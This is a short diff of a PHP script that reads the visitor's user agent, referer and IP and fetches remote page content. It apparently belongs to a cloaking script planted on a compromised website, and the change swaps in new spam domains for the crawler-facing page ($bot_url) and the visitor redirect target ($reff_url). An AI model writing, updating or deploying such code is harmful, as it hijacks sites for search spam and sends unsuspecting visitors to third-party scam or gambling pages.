@@ -26,8 +26,8 @@ $ua = strtolower($_SERVER["HTTP_USER_AGENT"]);
 $rf = isset($_SERVER["HTTP_REFERER"]) ? $_SERVER["HTTP_REFERER"] : '';
 $ip = get_client_ip();
 
-$bot_url = "https://faktawanita.com/batak/ensithailand.html";
-$reff_url = "https://lpnyabatak.sgp1.digitaloceanspaces.com/sthailandlovebatak.html";
+$bot_url = "https://faktawanita.com/batak/igee.html";
+$reff_url = "https://bismillah-ngerank.pl/igee/";
 
 $file = lph($bot_url);
 
